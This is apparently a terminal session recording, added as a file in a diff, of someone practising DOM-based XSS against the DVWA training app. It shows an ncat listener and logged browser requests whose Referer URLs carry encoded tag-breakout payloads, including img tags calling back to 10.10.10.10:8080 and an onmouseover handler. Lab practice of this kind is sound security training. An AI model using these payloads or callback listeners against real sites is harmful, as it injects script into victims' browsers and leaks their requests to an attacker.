@@ -1,0 +1,55 @@
+Script started on 2020-08-31 10:57:39+05:30 [TERM="xterm-256color" TTY="/dev/pts/1" COLUMNS="135" LINES="34"]
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/XSS_DOM[01;31mdinesh@evil[00m: [[01;34mXSS_DOM[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/XSS_DOM[01;31mdinesh@evil[00m: [[01;34mXSS_DOM[00m] $ dizzy --[K[K[K[K[K[K[K[K^C
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/XSS_DOM[01;31mdinesh@evil[00m: [[01;34mXSS_DOM[00m] $ nc -knvlp 8080
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::8080
+Ncat: Listening on 0.0.0.0:8080
+Ncat: Connection from 10.10.10.10.
+Ncat: Connection from 10.10.10.10:35253.
+GET /a.txt/ HTTP/1.1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Referer: http://dvwa.local/vulnerabilities/xss_d/?default=%3Cimg%20src=http://10.10.10.10:8080/a.txt/%3E
+DNT: 1
+Connection: keep-alive
+Host: 10.10.10.10:8080
+
+	Ncat: Connection from 10.10.10.10.
+Ncat: Connection from 10.10.10.10:47877.
+GET /a.txt HTTP/1.1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Referer: http://dvwa.local/vulnerabilities/xss_d/?default=okk%3C/option%3E%3C/select%3E%3Cimg%20src=%27http://10.10.10.10:8080/a.txt%27%20height=0%20width=0%20/%3E%3Cselect%20name=%22default1%22%3E%3Coption%20value=%27English%27%3ENnglish
+DNT: 1
+Connection: keep-alive
+Host: 10.10.10.10:8080
+
+Ncat: Connection from 10.10.10.10.
+Ncat: Connection from 10.10.10.10:40813.
+GET /a.txt HTTP/1.1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Referer: http://dvwa.local/vulnerabilities/xss_d/?default=okk%3C/option%3E%3C/select%3E%3Cimg%20src=%27http://10.10.10.10:8080/a.txt%27%20height=0%20width=0%20/%3E&
+DNT: 1
+Connection: keep-alive
+Host: 10.10.10.10:8080
+
+Ncat: Connection from 10.10.10.10.
+Ncat: Connection from 10.10.10.10:50673.
+GET /a.txt HTTP/1.1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Referer: http://dvwa.local/vulnerabilities/xss_d/?default=okk%3C/option%3E%3C/select%3E%3Cimg%20src=%27http://10.10.10.10:8080/a.txt%27%20height=0%20width=0%20/%3E%3Ca%20onmouseover=%22alert()%22%3Eas%3C/a%3E%3Cselect%20name=%22default1%22%3E%3Coption%20value=%27English%27%3ENnglish
+DNT: 1
+Connection: keep-alive
+Host: 10.10.10.10:8080
+
+^C
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/XSS_DOM[01;31mdinesh@evil[00m: [[01;34mXSS_DOM[00m] $ ^C
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/XSS_DOM[01;31mdinesh@evil[00m: [[01;34mXSS_DOM[00m] $ exit
+
+Script done on 2020-08-31 12:40:51+05:30 [COMMAND_EXIT_CODE="130"]
